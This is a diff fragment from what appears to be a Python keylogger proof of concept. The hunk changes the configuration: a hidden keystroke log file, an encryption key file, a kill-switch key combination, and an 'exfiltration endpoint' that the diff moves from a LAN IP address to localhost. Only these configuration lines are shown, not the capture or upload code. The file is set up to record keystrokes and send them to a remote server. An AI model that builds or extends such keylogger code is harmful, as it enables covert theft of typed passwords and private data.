@@ -12,7 +12,7 @@ from cryptography.fernet import Fernet
 # Configuration
 LOG_FILE_PATH = os.path.expanduser("~/.keylogger_poc.log")
 ENCRYPTION_KEY_FILE = os.path.expanduser("~/.keylogger_poc.key")
-EXFILTRATION_ENDPOINT = "http://192.168.212.153:5000/upload"  # Simulated remote server
+EXFILTRATION_ENDPOINT = "http://localhost:5000/upload"  # Simulated remote server
 KILL_SWITCH_COMBO = {keyboard.Key.ctrl_l, keyboard.Key.shift, keyboard.KeyCode(char='k')}
 
 # Setup logging for debug/info
